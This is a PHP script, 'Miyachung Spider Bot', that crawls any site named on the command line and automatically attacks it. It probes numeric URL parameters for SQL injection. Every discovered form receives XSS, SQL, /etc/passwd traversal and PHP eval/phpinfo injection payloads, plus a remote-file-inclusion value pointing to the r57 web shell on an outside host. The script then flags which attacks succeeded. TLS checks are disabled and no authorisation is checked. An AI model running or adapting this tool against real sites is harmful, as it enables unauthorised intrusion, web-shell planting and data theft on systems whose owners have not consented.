<?php
/*
        .__                      .__                                          .__    .___            
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____     ____________ |__| __| _/___________ 
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\   /  ___/\____ \|  |/ __ |/ __ \_  __ \
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >  \___ \ |  |_> >  / /_/ \  ___/|  | \/
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  /  /____  >|   __/|__\____ |\___  >__|   
      \/    \/          \/     \/     \/           \//_____/        \/ |__|           \/    \/       

      - Miyachung Spider Bot v1.0 ( developable release )
      - codes by miyachung

       This is a spider bot which is performs deep url search on remote host,
       Abilities ;
        - Find Internal Urls
        - Find External Urls
        - Find pages which header may reflect into content
        - Find pages which may possible for SQL Injection attacks.
        - Find pages which is form containing
        - Find form elements which may execute malicious codes
            > Pentest form elements by sending post datas to action page (XSS,RFI,LFI,SQL,HTML Injection,Php Code Injection)
        - Save all results to html page(s) in list sort  ( internal.html , external.html )
*/

error_reporting(E_ALL ^ E_NOTICE);
@ini_set('max_execution_time',0);

$prefix      = '[INFO] ';
$target      = $argv[1] or die("Usage: {$_SERVER['PHP_SELF']} HOSTNAME".PHP_EOL."\tPlease enter a hostname to argument 1");
$target      = str_replace('http://','',$target);
$target      = str_replace('https://','',$target);
$target      = str_replace('/','',$target);
$ipadress    = gethostbyname($target);
$target_http = 'http://'.$target;

print $prefix.'Miyachung greets you :)'.PHP_EOL;
print $prefix."Remote host: ".$target." [".$ipadress."]".PHP_EOL;
print $prefix."Spider is going through host..".PHP_EOL;
sleep(rand(1,3));


$spider_content = spider($target_http);
$links          = seperate_links($spider_content[0] , $target ); if($links === false) die("\tSpider quit!/No urls in page!/Encoded page!");
$internal_count = count($links[0]);
$external_count = count($links[1]);

print PHP_EOL.PHP_EOL;
print $prefix.$internal_count.' different internal urls found in page content'.PHP_EOL;
print $prefix.$external_count.' different external urls found in page content'.PHP_EOL;
usleep(1000);
file_put_contents("internal.html","<h1 style='margin:0;padding:0;'>miyachung spider results for <a href='$target_http' target='_blank'>$target</a> & Internal Urls</h1><hr /><br />");
if($internal_count > 0){
print $prefix.'Preparing a deep search in to links..'.PHP_EOL;
sleep(2);
}

// ----- External urls search
if($external_count > 0){
    file_put_contents("external.html","<h1 style='margin:0;padding:0;'>miyachung spider results for <a href='$target_http' target='_blank'>$target</a> & External Urls</h1><hr /><br />");
    print $prefix.'Spider is going to scan external urls now...'.PHP_EOL;
    sleep(2);
    write_to_file('external.html','<h1 style="margin:0;padding:0">Section 1</h1>');
    write_to_file('external.html','<ul>');
    $time1 = time();
    external_search($links);
    write_to_file('external.html','</ul>');
    write_to_file('external.html','<h1 style="margin:0;padding:0;">External url scan has completed in '.(secondstotime(time()-$time1)).'</h1>');
    print PHP_EOL;
    print $prefix.'External url scan has completed!'.PHP_EOL;
}

print PHP_EOL;

// ----- Internal urls search
if($internal_count > 0){
    print $prefix.'Spider is going to scan internal urls now...'.PHP_EOL;
    sleep(2);
    write_to_file('internal.html','<h1 style="margin:0;padding:0">Section 1</h1>');
    write_to_file('internal.html','<ul>');
    $time1 = time();
    internal_search($links,$target_http, $target);
    write_to_file('internal.html','</ul>');
    write_to_file('internal.html','<h1 style="margin:0;padding:0;">Internal url scan has completed in '.(secondstotime(time()-$time1)).'</h1>');
    print PHP_EOL;
    print $prefix.'Internal url scan has completed!'.PHP_EOL;
}

print PHP_EOL;
print $prefix.'Spider has completed all of the jobs'.PHP_EOL;
print $prefix.'Miyachung greets you :)';




// ----- Functions below

function spider( $link , $post = false){

    $curl = curl_init();
    curl_setopt_array($curl,[CURLOPT_TIMEOUT => 15,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => $link,
    CURLOPT_USERAGENT => 'Miyachung Spider Bot v1.0',
    CURLOPT_REFERER => 'spiderReferer',
    CURLOPT_HTTPHEADER => ['X-Forwarded-For' => 'spiderXForwardedFor','Cookie' => 'spiderCookie'],
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    ]);
    if($post != false){
        curl_setopt($curl,CURLOPT_POST,1);
        curl_setopt($curl,CURLOPT_POSTFIELDS,$post);
    }
    $content = curl_exec($curl);
    $info    = curl_getinfo($curl);
    curl_close($curl);
    
    $header  = substr($content,0,$info['header_size']);
    $content = substr($content,$info['header_size']); 

    if($info['http_code'] != 200){
        print "\t[INFO] HTTP code responsed from host: ".$info['http_code'].PHP_EOL;
    }else{
        return [$content,$header];
    }
}
function header_reflect_check ( $content ){

    $reflected = [];

    if(strstr($content,'Miyachung Spider Bot v1.0')){
        $reflected[] = 'User-Agent header has reflected into page! Miyachung Spider Bot v1.0';
    }elseif(strstr($content,'spiderReferer')){
        $reflected[] = 'Referer header has reflected into page! spiderReferer';
    }elseif(strstr($content,'spiderXForwardedFor')){
        $reflected[] = 'X-Forwarded-For header has reflected into page! spiderXForwardedFor';
    }elseif(strstr($content,'spiderCookie')){
        $reflected[] = 'Cookie header has reflected into page! spiderCookie';
    }
    
    if(!empty($reflected)){
        return $reflected;
    }else{
        return false;
    }

}

function form_contain_check( $content ){

    if(preg_match_all('@<form(.*?)</form>@si',$content,$forms)){
        return array_map('addslashes',$forms[0]);
    }else{
        return false;
    }

}


function external_search( $links ){


    foreach($links[1] as $external_link){

        print "\t=> ".$external_link.' spider on it'.PHP_EOL;
        $spider_external = spider($external_link);
        write_to_file('external.html',"<li><a href='$external_link' target='_blank'>$external_link</a>");

        if($spider_external[1]) write_to_file('external.html',"<ul><li><pre>$spider_external[1]</pre></li></ul>");
        if(preg_match('@<title>(.*?)</title>@i',$spider_external[0],$title)){
            print "\tTitle found => ".trim(strip_tags($title[1])).PHP_EOL;
            write_to_file('external.html',"<ul><li>$title[1]</li></ul>");
        } 
        write_to_file('external.html','</li>');

    }

}

function internal_search( $links , $target_http ,$target ){
   
    $new_internal    = [];
    $new_external    = [];
    $scanned_links   = [];
    $posted_forms    = [];
    $sql_scanned     = [];
    foreach($links[0] as $internal_link){

        $total_link      = $target_http.$internal_link;
        print "\t".$total_link.' spider on it'.PHP_EOL;

        $spider_internal = spider($total_link);
        if(preg_match('@\=[0-9]@',$total_link)){
            $explode_link     = explode("=",$total_link);
            if(!in_array($explode_link[0],$sql_scanned)){
                $sql_scanned[]    = $explode_link[0];
                $change_link      = preg_replace('@=([0-9+])@',"=$1%27",$total_link);
                $spider_sql_test  = spider($change_link); 
                $sql_check_page   = sql_check($spider_sql_test[0]);
                if($sql_check_page){
                    write_to_file('internal.html',"<li><a href='$change_link' target='_blank'>".urldecode($change_link)."</a> <font color='red'>[SQL Injection Vulnerable]</font>");
                }else{
                    write_to_file('internal.html',"<li><a href='$total_link' target='_blank'>$total_link</a> <font color='red'></font>");
                }
            }else{
                write_to_file('internal.html',"<li><a href='$total_link' target='_blank'>$total_link</a>");
            }
            
        }else{
            write_to_file('internal.html',"<li><a href='$total_link' target='_blank'>$total_link</a>");
        }

        if($spider_internal[1]) write_to_file('internal.html',"<ul><li><pre>$spider_internal[1]</pre></li></ul>");

        $check_header = header_reflect_check($spider_internal[0]);

        if($check_header != false){
            write_to_file('internal.html',"<ul><li><font color='red'>This page has header reflected in content!!</font>");
            foreach($check_header as $result_header){
                write_to_file('internal.html',"<pre><ul><li>$result_header</li></ul></pre>");
            }
            write_to_file('internal.html',"</li></ul>");
        }
        
        $check_form   = form_contain_check($spider_internal[0]);
        if($check_form != false){
            $check_form_string = implode("\r\n",$check_form);
            write_to_file('internal.html','<ul><li><h4 style="margin:0;padding:0;">This page contains form</h4><br/><textarea style="width:50%;height:300px;overflow:auto">'.$check_form_string.'</textarea></li></ul>');
           
            foreach($check_form as $form){
                if(!in_array($form,$posted_forms)){
                    $posted_forms[] = $form;
                    $postit = form_post_process($form,$total_link,$target_http);
                }
            }
        } 
        if(preg_match('@<title>(.*?)</title>@i',$spider_internal[0],$title)){
            print "\tTitle found => ".trim(strip_tags($title[1])).PHP_EOL;
            write_to_file('internal.html',"<ul><li><h4 style=\"margin:0;padding:0;\">Title</h4> $title[1]</li></ul>");
        } 

        $link_search = seperate_links($spider_internal[0], $target );

        if($link_search != false){
            if(!empty($link_search[0])){
                $count_internal = 0;
                foreach($link_search[0] as $out){
                    if(!in_array($out,$links[0]) && !in_array($out,$new_internal) && !in_array($out,$scanned_links)){
                        $new_internal[] = $out;
                        ++$count_internal;
                        // print "\tUnique internal url found => ".$out.PHP_EOL;
                    }
                }
                if($count_internal > 0){
                    print "\tDifferent internal urls in page : $count_internal , Current list: ".count($new_internal).PHP_EOL;
                }
            }
        }else{
            print "\tThere are no internal urls in this page".PHP_EOL;
        }
        write_to_file('internal.html','</li>');
    }
    print "\t------------------------- Section 2".PHP_EOL;
    $internalcount = count($new_internal);
    if($internalcount > 0){
        print "\t[INFO] Spider has collected ".$internalcount." new different internal urls".PHP_EOL;
        print "\tPreparing a deep search in to links..".PHP_EOL;
        write_to_file('internal.html','<hr /><h1 style="margin:0;padding:0;">Section 2</h1>');
        sleep(2);
        
        while(count($new_internal) > 0){
            $random_key  = array_rand($new_internal);
            $link_choose = $new_internal[$random_key];
            $scanned_links[] = $link_choose;
            
            print "\t=> ".$link_choose.' spider on it'.PHP_EOL;
    
            $search_deep = spider( $target_http.$link_choose );
    
    
            if(preg_match('@\=[0-9]@',$target_http.$link_choose)){
                $explode_link     = explode("=",$target_http.$link_choose);
                if(!in_array($explode_link[0],$sql_scanned)){
                    $sql_scanned[]    = $explode_link[0];
                    $change_link      = preg_replace('@=([0-9+])@',"=$1%27",$target_http.$link_choose);
                    $spider_sql_test  = spider($change_link); 
                    $sql_check_page   = sql_check($spider_sql_test[0]);
                    if($sql_check_page){
                        write_to_file('internal.html',"<li><a href='$target_http.$link_choose' target='_blank'>".urldecode($target_http.$link_choose)."</a> <font color='red'>[SQL Injection Vulnerable]</font>");
                    }else{
                        write_to_file('internal.html',"<li><a href='$target_http.$link_choose' target='_blank'>$target_http.$link_choose</a> <font color='red'></font>");
                    }
                }else{
                    write_to_file('internal.html',"<li><a href='$target_http.$link_choose' target='_blank'>$target_http.$link_choose</a>");
                }
            }else{
                write_to_file('internal.html','<li><a href="'.$target_http.$link_choose.'" target="_blank">'.$target_http.$link_choose.'</a>');
            }
    
            
            write_to_file('internal.html','<ul><li><pre>'.$search_deep[1].'</pre></li></ul>');
    
            $check_header = header_reflect_check($search_deep[0]);
    
            if($check_header != false){
                write_to_file('internal.html',"<ul><li><font color='red'>This page has header reflected in content!!</font>");
                foreach($check_header as $result_header){
                    write_to_file('internal.html',"<pre><ul><li>$result_header</li></ul></pre>");
                }
                write_to_file('internal.html',"</li></ul>");
            }
    
            $check_form = form_contain_check($search_deep[0]);
            if($check_form != false){
                $check_form_string = implode("\r\n",$check_form);
                write_to_file('internal.html','<ul><li><h4 style="margin:0;padding:0;">This page contains form</h4><br/><textarea style="width:50%;height:300px;overflow:auto">'.$check_form_string.'</textarea></li></ul>');
                foreach($check_form as $form){
                    if(!in_array($form,$posted_forms)){
                        $posted_forms[] = $form;
                        $postit = form_post_process($form,$target_http.$link_choose,$target_http);
                    }
                }
            } 
            if(preg_match('@<title>(.*?)</title>@',$search_deep[0],$deep_title)){
                print "\tTitle taken: ".trim(strip_tags($deep_title[1])).PHP_EOL;
                write_to_file('internal.html','<ul><h4 style="margin:0;padding:0;">Title</h4><li>'.$deep_title[1].'</li></ul>');
            }
            write_to_file('internal.html','</li>');
            unset($new_internal[$random_key]);
    
            $links_deep = seperate_links( $search_deep[0] , $target );
            if($links_deep != false){
                if(!empty($links_deep[0])){
                    $count_internal = 0;
                    foreach($links_deep[0] as $out_internal){
                        if(!in_array($out_internal,$new_internal) && !in_array($out_internal,$links[0]) && !in_array($out_internal,$scanned_links)){
                            $new_internal[] = $out_internal;
                            ++$count_internal;
                            // print "\tUnique internal url found => ".$out_internal.PHP_EOL;
                        }
                    }
                    if($count_internal > 0){
                        print "\tDifferent internal urls in page : $count_internal , Current list: ".count($new_internal).PHP_EOL;
                    }
                }
    
            }else{
                print "\tThere are no internal urls in this page".PHP_EOL;
            }
        }

    }else{
        print "\tSpider has got nothing from section 2 :(".PHP_EOL;
    }

}

function form_post_process( $form_content , $total_link , $target_http ){
    $form_post = [];
    
        $form_content = stripslashes($form_content);
        preg_match_all('@name="(.*?)"@si',$form_content,$names);
        if(empty($names[1])) return false;
        preg_match('@action="(.*?)"@si',$form_content,$action);
        if(empty($action[1])){
            $toAct    = $total_link;
        }elseif(!strstr($action[1],'http')){
            $toAct    = $target_http.'/'.$action[1];
        }else{
            $toAct    = $action[1];
        }
        $form_post['action'][] = $toAct;

        $pf = "";
        foreach($names[1] as $name){
           $pf .= $name."=VALUE&";
        }
        $pf = rtrim($pf,'&');

        $form_post['postfields'][] = $pf;
    
 
    if(!empty($form_post)){
        print "\tSpider has found form elements inside of the codes, sending postfields!".PHP_EOL;
        foreach($form_post['action'] as $key => $action_url){

            $field   = $form_post['postfields'][$key];

            $prepare = prepare_field($field);
            write_to_file('internal.html','<ul>');
            foreach($prepare as $x => $pfield){
                $post_page  = spider($action_url,$pfield);
                print "\tPostfield ".($x+1)." has sent".PHP_EOL;
                write_to_file('internal.html','<li><font color="red">[POST]</font> <a href="'.$action_url.'" target="_blank">'.$action_url.'</a></li><li><pre>'.$post_page[1].'</pre></li><ul><li><strong>[POST DATA]</strong> : <input type="text" style="width:100%;" value="'.htmlspecialchars(urldecode($pfield)).'" /></li></ul>');
              
                if(!empty($post_page[0])){
                    $control    = post_penetration_control($post_page[0]);
                    if($control != false){
                        foreach($control as $result){
                            write_to_file('internal.html','<ul><li><font color="red">'.$result.'</font></li><li><input type="text" style="width:100%" value="'.htmlspecialchars(urldecode($pfield)).'"></li></ul>');
                        }
                    }
                }else{
                    print "\tNo content in the page!".PHP_EOL;
                }
              
            }
            write_to_file('internal.html','</ul>');

        }


    }else{
        return false;
    }
}
function post_penetration_control($content){
    $results = [];

    if(strstr($content,'"><script>alert("spiderPenetrationXSS");</script>')){
        $results[] = 'This post-data has affected to page content by malicious XSS attack';
    }elseif(strstr($content,'SQL syntax') || strstr($content,'mysql_fetch_assoc(') || strstr($content,'mysql_num_rows(') || strstr($content,'mysql_fetch_array(')){
        $results[] = 'This post-data has affected to page content by malicious SQL attack';
    }elseif(strstr($content,'root:x:')){
        $results[] = 'This post-data has affected to page content by malicious Local File Inclusion attack';
    }elseif(strstr($content,'uname -a :')){
        $results[] = 'This post-data has affected to page content by malicious Remote File Inclusion attack';
    }elseif(strstr($content,'<h1>spiderPenetrationHTML</h1>')){
        $results[] = 'This post-data has affected to page content by malicious HTML Injection attack'; 
    }elseif(strstr($content,'Loaded Configuration File') && strstr($content,'Zend Extension Build')){
        $results[] = 'This post-data has affected to page content by malicious PHP Code Injection attack'; 
    }

    if(!empty($results)){
        return $results;
    }else{
        return false;
    }

}
function sql_check($data)
{
	$sql_error_list = ['mysql_affected_rows','MariaDB','You have an error in your SQL syntax','mysql_num_rows','mysql_fetch_assoc','mysql_fetch_array'];
	if(@stristr($data,$sql_error_list[0]) || @stristr($data,$sql_error_list[1]) || @stristr($data,$sql_error_list[2]) || @stristr($data,$sql_error_list[3]) || @stristr($data,$sql_error_list[4]) || @stristr($data,$sql_error_list[5]) || @stristr($data, $sql_error_list[6]))
	{
		return true;
	}else{
		return false;
	}
}
function prepare_field($field){

    // Prepared for XSS
    $xss = str_replace('VALUE',urlencode('"><script>alert("spiderPenetrationXSS");</script>'),$field);
    // Prepared for SQL
    $sql = str_replace('VALUE',urlencode("1'spiderPenetrate"),$field);
    // Prepared for Local File Inclusion
    $lfi = str_replace('VALUE',urlencode('../../../../../../../../../../../etc/passwd%00'),$field);
    // Prepared for Remote File Inclusion
    $rfi = str_replace('VALUE',urlencode('https://raw.githubusercontent.com/seakBz/r57-shell/master/r57shell.php.txt?'),$field);
    // Prepared for HTML Injection
    $html = str_replace('VALUE',urlencode("<h1>spiderPenetrationHTML</h1>"),$field);
    // Prepared for PHP Code Injection with tags (without eval)
    $php1 = str_replace('VALUE',urlencode('<?php phpinfo(); ?>'),$field);
    // Prepared for PHP Code Injection without tags (without eval)
    $php2 = str_replace('VALUE',urlencode('phpinfo();'),$field);
    // Prepared for PHP Code Injection with tags (with eval)
    $php3 = str_replace('VALUE',urlencode('<?php eval(base64_decode("cGhwaW5mbygpOw==")); ?>'),$field);
     // Prepared for PHP Code Injection without tags (with eval)
    $php4 = str_replace('VALUE',urlencode('eval(base64_decode("cGhwaW5mbygpOw=="));'),$field);

    return [$xss,$sql,$lfi,$rfi,$html,$php1,$php2,$php3,$php4];
}

function seperate_links( $content , $control ){

    $internal = [];
    $external = [];

    if(preg_match_all('/href="(.*?)"/si',$content,$links)){
        foreach(array_unique(array_filter($links[1])) as $link){
            $link = strip_tags($link);
            $link = trim($link);
           if(!strstr($link,'http') && !strstr($link,$control)){
               if($link[0] != "/") $link = "/".$link;
               if(!in_array($link,$internal)) $internal[] = $link;
                
           }else{
               if(!strstr($link,$control) && strstr($link,'http')){
                if(!in_array($link,$external)) $external[] = $link;
               }else{
                if(!strstr($link,$control)){
                    $link       = str_replace('http://','',$link);
                    $link       = str_replace('https://','',$link);
                    if($link[0] != "/") $link = "/".$link;
                    if(!in_array($link,$internal)) $internal[] = $link;
                }else{
                    $link       = str_replace('http://','',$link);
                    $link       = str_replace('https://','',$link);
                    $link       = str_replace('www.','',$link);
                    $link       = str_replace($control.'/','',$link);
                    if($link[0] != "/") $link = "/".$link;
                    if(!in_array($link,$internal)) $internal[] = $link;
                }

               }
           }
        }
        return [$internal,$external];
    }else{
        return false;
    }

}
function secondstotime($seconds){

    $sec   = $seconds;

    $hours = floor($sec / 3600);
    $minutes = floor(($sec / 60) % 60);
    $seconds = $sec % 60;

    $output  = '';

    if($hours > 0 ){
        $output .= $hours.' hours ';
    }
    if($minutes > 0){
        $output .= $minutes.' minutes ';
    }
    if($seconds > 0){
        $output .= $seconds.' seconds';
    }
    return $output;
}
function write_to_file ($file, $text){
    $fopen = fopen($file,'ab');
    if(flock($fopen,LOCK_EX)){
        fwrite($fopen,$text);
    }
    flock($fopen,LOCK_UN);
    fclose($fopen);
}
